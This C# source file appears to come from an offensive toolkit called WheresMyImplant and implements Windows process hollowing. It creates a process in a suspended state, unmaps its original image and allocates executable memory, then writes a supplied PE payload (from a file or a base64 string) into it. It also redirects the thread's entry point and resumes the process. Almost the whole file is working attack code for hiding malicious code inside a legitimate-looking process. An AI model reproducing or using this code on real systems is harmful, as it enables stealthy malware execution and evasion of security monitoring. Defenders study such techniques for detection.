using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    //https://github.com/idan1288/ProcessHollowing32-64/blob/master/ProcessHollowing/ProcessHollowing.c
    //https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp

    sealed class HollowProcess : Base
    {
        Winbase._PROCESS_INFORMATION lpProcessInformation;
        IntPtr targetImageBaseAddress;

        IntPtr allocatedTargetAddress;
        Winnt._IMAGE_FILE_HEADER targetFileHeader;
        Winnt._IMAGE_NT_HEADERS targetNTHeader;
        Winnt._IMAGE_NT_HEADERS64 targetNTHeader64;


        Byte[] image;
        GCHandle pinnedArray;
        IntPtr imagePtr;
        Winnt._IMAGE_FILE_HEADER imageFileHeader;
        Winnt._IMAGE_DOS_HEADER imageDosHeader;
        Winnt._IMAGE_NT_HEADERS imageNTHeader;
        Winnt._IMAGE_NT_HEADERS64 imageNTHeader64;
        Winnt.CONTEXT context32;
        Winnt.CONTEXT64 context64;

        Boolean is32Bit;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal HollowProcess()
        {
            lpProcessInformation = new Winbase._PROCESS_INFORMATION();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a suspended process, and then opens a handle to the process
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean CreateSuspendedProcess(String lpApplicationName)
        {
            String lpCommandLine = lpApplicationName;
            Winbase._SECURITY_ATTRIBUTES lpProcessAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._SECURITY_ATTRIBUTES lpThreadAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._STARTUPINFO lpStartupInfo = new Winbase._STARTUPINFO();

            if (!kernel32.CreateProcess(
                lpApplicationName,
                lpCommandLine,
                ref lpProcessAttributes,
                ref lpThreadAttributes,
                false,
                Winbase.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref lpStartupInfo,
                out lpProcessInformation
            ))
            {
                return false;
            }

            WriteOutputGood(String.Format("Started Process: {0}", lpProcessInformation.dwProcessId));
            WriteOutputGood(String.Format("Started Thread:  {0}", lpProcessInformation.dwThreadId));
            WriteOutputGood(String.Format("Recieved Handle: 0x{0}", lpProcessInformation.hProcess.ToString("X4")));

            return ReadPEB();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the PEB Base Address from NtQueryInformationProcess then reads the PEB
        // to get the image base address
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadPEB()
        {
            UInt32 processInformationLength = (UInt32)Marshal.SizeOf(typeof(ntdll._PROCESS_BASIC_INFORMATION));
            IntPtr processInformation = Marshal.AllocHGlobal((Int32)processInformationLength);
            ntdll._PROCESS_BASIC_INFORMATION processBasicInformation;
            try
            {
                UInt32 returnLength = 0;
                UInt32 returnStatus = ntdll.NtQueryInformationProcess(
                    lpProcessInformation.hProcess,
                    ntdll.PROCESSINFOCLASS.ProcessBasicInformation,
                    processInformation,
                    processInformationLength,
                    ref returnLength
                );

                if (0 != returnStatus)
                {
                    return false;
                }
                processBasicInformation = (ntdll._PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(ntdll._PROCESS_BASIC_INFORMATION));
            }
            catch (Exception)
            {
                WriteOutputBad("ReadPEB Failed");
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(processInformation);
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("PEB Base Address:   0x{0}", processBasicInformation.PebBaseAddress.ToString("X4")));
            Winternl._PEB64 peb;
            UInt32 pebSize = (UInt32)Marshal.SizeOf(typeof(Winternl._PEB64));
            IntPtr buffer = Marshal.AllocHGlobal((Int32)pebSize);
            try
            {
                UInt32 returnSize = 0;
                if (!kernel32.ReadProcessMemory64(
                    lpProcessInformation.hProcess,
                    (UInt64)processBasicInformation.PebBaseAddress.ToInt64(),//context.Rdx 
                    buffer,
                    (UInt64)pebSize,
                    ref returnSize))
                {
                    return false;
                }
                peb = (Winternl._PEB64)Marshal.PtrToStructure(buffer, typeof(Winternl._PEB64));
                targetImageBaseAddress = peb.ImageBaseAddress;
                WriteOutputNeutral(String.Format("Image Base Address: 0x{0}", targetImageBaseAddress.ToString("X4")));
            }
            catch (Exception error)
            {
                WriteOutputBad("ReadPEB Failed");
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }

            return GetTargetArch();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the Imagef File Headers from the Image Base Address
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetTargetArch()
        {
            Winbase._SYSTEM_INFO systemInfo;
            kernel32.GetNativeSystemInfo(out systemInfo);
            //Console.WriteLine(systemInfo.wProcessorArchitecture);
            if (Winbase.INFO_PROCESSOR_ARCHITECTURE.PROCESSOR_ARCHITECTURE_INTEL == systemInfo.wProcessorArchitecture)
            {
                is32Bit = true;
            }
            /*
            if (!kernel32.IsWow64Process(lpProcessInformation.hProcess, out is32Bit))
            {
                WriteOutputBad("IsWow64Process Failed");
                return false;
            }
            */
            return GetContext();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetContext()
        {
            if (!(is32Bit ? GetContext32() : GetContext64()))
            {
                return false;
            }

            return ReadNTHeaders();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean GetContext32()
        {
            context32 = new Winnt.CONTEXT();
            //context32.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context32));
            try
            {
                Marshal.StructureToPtr(context32, lpContext, false);

                WriteOutputNeutral("Getting Thread Context");
                kernel32.GetThreadContext(lpProcessInformation.hThread, lpContext);

                context32 = (Winnt.CONTEXT)Marshal.PtrToStructure(lpContext, typeof(Winnt.CONTEXT64));
            }
            catch (Exception error)
            {
                if (error is ArgumentException || error is ArgumentNullException)
                {
                    WriteOutputBad("GetThreadContext Failed");
                }
            }
            finally
            {
                Marshal.FreeHGlobal(lpContext);
            }

            WriteOutputNeutral(String.Format("EAX Address: 0x{0}", context32.Eax.ToString("X4")));
            WriteOutputNeutral(String.Format("EBX Address: 0x{0}", context32.Ebx.ToString("X4")));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean GetContext64()
        {
            context64 = new Winnt.CONTEXT64();
            context64.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context64));
            try
            {
                Marshal.StructureToPtr(context64, lpContext, false);

                WriteOutputNeutral("Getting Thread Context");
                kernel32.GetThreadContext(lpProcessInformation.hThread, lpContext);

                context64 = (Winnt.CONTEXT64)Marshal.PtrToStructure(lpContext, typeof(Winnt.CONTEXT64));
            }
            catch
            {
            }
            finally
            {
                Marshal.FreeHGlobal(lpContext);
            }

            WriteOutputNeutral(String.Format("RCX Address: 0x{0}", context64.Rcx.ToString("X4")));
            WriteOutputNeutral(String.Format("RDX Address: 0x{0}", context64.Rdx.ToString("X4")));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the NT Headers from the Image Base Address
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadNTHeaders()
        {
            Int32 nSize = 0;
            IntPtr buffer = IntPtr.Zero;
            UInt32 numberBytesRead = 0;

            if (is32Bit)
            {
                nSize = Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS));
                buffer = Marshal.AllocHGlobal(nSize);
                try
                {
                    if (!kernel32.ReadProcessMemory64(
                        lpProcessInformation.hProcess,
                        (UInt64)targetImageBaseAddress.ToInt64(),
                        buffer,
                        (UInt32)nSize,
                        ref numberBytesRead))
                    {
                        return false;
                    }
                }
                catch (Exception)
                {
                    return false;
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
                targetNTHeader = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS));
                return true;

            }
            else
            {
                nSize = Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64));
                buffer = Marshal.AllocHGlobal(nSize);
                try
                {
                    if (!kernel32.ReadProcessMemory64(
                        lpProcessInformation.hProcess,
                        (UInt64)targetImageBaseAddress.ToInt64(),
                        buffer,
                        (UInt32)nSize,
                        ref numberBytesRead))
                    {
                        return false;
                    }
                }
                catch (Exception)
                {
                    return false;
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }
                targetNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS64));
                //Console.WriteLine(targetNTHeader64.FileHeader.Machine);
                return true;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads in the image to be injected
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadSourceImageFile(String sourceImage)
        {
            String file = System.IO.Path.GetFullPath(sourceImage);
            if (!System.IO.File.Exists(file))
            {
                WriteOutputBad("File Not Found");
                return false;
            }

            image = System.IO.File.ReadAllBytes(file); 
            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
            imagePtr = pinnedArray.AddrOfPinnedObject();

            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
            imageFileHeader = (Winnt._IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(ntHeaderPtr.ToInt64() + sizeof(UInt32)), typeof(Winnt._IMAGE_FILE_HEADER));
            if (is32Bit)
            {
                imageNTHeader = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS));
                return true;
            }
            else
            {
                imageNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));
                return true;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads in the image to be injected
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadSourceImageString(String sourceImage)
        {
            image = System.Convert.FromBase64String(sourceImage);
            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
            imagePtr = pinnedArray.AddrOfPinnedObject();

            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
            imageFileHeader = (Winnt._IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(ntHeaderPtr.ToInt64() + sizeof(UInt32)), typeof(Winnt._IMAGE_FILE_HEADER));
            if (is32Bit)
            {
                imageNTHeader = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS));
                return true;
            }
            else
            {
                imageNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));
                return true;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Todo Fix the Page_Execute_Read_Write
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage()
        {
            WriteOutputNeutral(String.Format("NtUnmapViewOfSection: 0x{0}", targetImageBaseAddress.ToString("X4")));
            UInt32 result = ntdll.NtUnmapViewOfSection(lpProcessInformation.hProcess, targetImageBaseAddress);
            if (0 != result)
            {
                WriteOutputBad("NtUnmapViewOfSection Failed");
                return false;
            }

            return is32Bit ? RemapImage32() : RemapImage64();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage32()
        {
            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")));
            //allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, targetImageBaseAddress, imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
            allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, new IntPtr((Int64)imageNTHeader.OptionalHeader.ImageBase), imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
            if (IntPtr.Zero == allocatedTargetAddress)
            {
                WriteOutputBad("VirtualAllocEx failed");
                return false;
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral("\nFinding Source Image Base");
            //UInt64 imageBase = (UInt64)Marshal.ReadInt64(imagePtr, (Int32)imageDosHeader.e_lfanew + offset1 + offset2 + offset3);
            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader.OptionalHeader.ImageBase.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess,
                allocatedTargetAddress,
                imagePtr,
                imageNTHeader.OptionalHeader.SizeOfHeaders,
                ref bytesWritten))
            {
                return false;
            }
            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader.OptionalHeader.SizeOfHeaders));

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
            {
                IntPtr offset = new IntPtr(
                    imagePtr.ToInt64() +
                    imageDosHeader.e_lfanew +
                    Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64)) +
                    (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                Winnt._IMAGE_SECTION_HEADER imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));

                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                bytesWritten = 0;
                if (!kernel32.WriteProcessMemory(
                    lpProcessInformation.hProcess,
                    new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress),
                    new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData),
                    (UInt32)imageSectionHeader.SizeOfRawData,
                    ref bytesWritten))
                {
                    return false;
                }
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage64()
        {
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")));
            allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, new IntPtr((Int64)imageNTHeader64.OptionalHeader.ImageBase), imageNTHeader64.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
            if (IntPtr.Zero == allocatedTargetAddress)
            {
                WriteOutputBad("VirtualAllocEx failed");
                return false;
            }

            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4")));
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(lpProcessInformation.hProcess, allocatedTargetAddress, imagePtr, imageNTHeader64.OptionalHeader.SizeOfHeaders, ref bytesWritten))
            {
                return false;
            }
            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders));

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
            {
                IntPtr offset = new IntPtr(
                    imagePtr.ToInt64() + 
                    imageDosHeader.e_lfanew + 
                    Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64)) + 
                    (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                Winnt._IMAGE_SECTION_HEADER imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));

                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                bytesWritten = 0;
                if (!kernel32.WriteProcessMemory(lpProcessInformation.hProcess, new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress), new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData), (UInt32)imageSectionHeader.SizeOfRawData, ref bytesWritten))
                {
                    return false;
                }
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess(Boolean bWait)
        {
            return is32Bit ? ResumeProcess32() : ResumeProcess64(bWait);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        // http://www.rohitab.com/discuss/topic/43738-getthreadcontext-is-failing/
        // sizeof(CONTEXT) = 716
        // offsetof(Ebx) = 164
        // offsetof(Eax) = 176
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess32()
        {
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        // http://www.rohitab.com/discuss/topic/43738-getthreadcontext-is-failing/
        // sizeof(CONTEXT) = 1232
        // offsetof(Rdx) = 136
        // offsetof(Rcx) = 128
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess64(Boolean wait)
        {
            WriteOutputNeutral(String.Format("Updating Thread Context"));

            context64.Rcx = (UInt64)allocatedTargetAddress.ToInt64() + imageNTHeader64.OptionalHeader.AddressOfEntryPoint;
            WriteOutputGood(String.Format("Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4")));
            
            //Updates the PEB
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(lpProcessInformation.hProcess, new IntPtr((long)context64.Rdx + 16), ref imageNTHeader64.OptionalHeader.ImageBase, (UInt32)IntPtr.Size, ref bytesWritten))
            {
                return false;
            }

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context64));
            Marshal.StructureToPtr(context64, lpContext, false);
            kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);

            WriteOutputNeutral("Resuming Main Thread");
            kernel32.ResumeThread(lpProcessInformation.hThread);

            if (wait)
            {
                kernel32.WaitForSingleObject(lpProcessInformation.hProcess, 0xFFFFFFFF);
            }
            return true;
        }

        internal Boolean ResumeProcessAlt()
        {
            IntPtr hThread = new IntPtr();
            if (0 != ntdll.NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, lpProcessInformation.hProcess, new IntPtr((Int64)context64.Rcx), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~HollowProcess()
        {
            pinnedArray.Free();
            kernel32.CloseHandle(lpProcessInformation.hProcess);
            kernel32.CloseHandle(lpProcessInformation.hThread);
        }
    }
}